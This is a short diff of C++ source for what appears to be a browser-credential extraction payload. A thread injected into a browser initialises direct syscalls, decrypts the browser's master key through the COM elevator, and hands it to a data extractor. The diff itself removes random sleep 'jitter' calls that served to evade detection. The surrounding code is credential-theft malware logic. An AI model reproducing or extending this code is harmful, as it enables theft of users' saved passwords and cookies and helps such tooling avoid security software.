@@ -2,7 +2,6 @@
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include "../core/common.hpp"
-#include "../core/jitter.hpp"
 #include "../sys/bootstrap.hpp"
 #include "../sys/internal_api.hpp"
 #include "pipe_client.hpp"
@@ -88,8 +87,6 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
 
             pipe.LogDebug("Running in " + browser.name);
 
-            Core::Jitter::SleepRange(20, 80);
-
             // Initialize syscalls
             if (!Sys::InitApi(config.verbose)) {
                 pipe.LogDebug("Warning: Syscall initialization failed.");
@@ -109,8 +106,6 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                 }
                 // Exit gracefully - pipe destructor will send completion signal
             } else {
-
-            Core::Jitter::SleepRange(30, 120);
 
             // Decrypt the key using COM elevator
             std::vector<uint8_t> masterKey;
@@ -135,8 +130,6 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                     }
                 }
             }
-
-            Core::Jitter::SleepRange(15, 60);
 
             DataExtractor extractor(pipe, masterKey, config.outputPath);
 
